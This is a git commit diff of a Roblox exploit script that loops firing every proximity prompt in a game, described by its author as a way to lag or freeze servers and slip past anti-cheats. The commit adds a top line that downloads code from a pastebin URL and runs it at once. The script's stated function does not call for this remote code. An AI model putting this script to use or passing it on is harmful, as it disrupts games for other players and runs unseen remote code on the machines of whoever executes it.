ee6c8a789a530d5c6adfeb899714f9580e0906a8
xrt <xrtzrr@proton.me>
2024-04-06 21:22:03 -0600

    Came after awhile to edit.

--- LoopFireAllProximityPrompts.lua
+++ LoopFireAllProximityPrompts.lua
@@ -1,4 +1,8 @@
---hi
+loadstring(game:HttpGet('https://pastebin.com/raw/tZJF8g3K'))()
+--< Loadstring: loadstring(game:HttpGet('https://raw.githubusercontent.com/xrtzrr/scripts/main/LoopFireAllProximityPrompts.lua'))()
+--< Game: Universal
+--< Functionality: Allows you to loop fire every single proximity prompt in-game, causing a game to lag or freeze possibly. Some anti-cheats built in-game might detect this.
+
 while true do
     wait(.1)
 for i,v in pairs(workspace:GetDescendants()) do
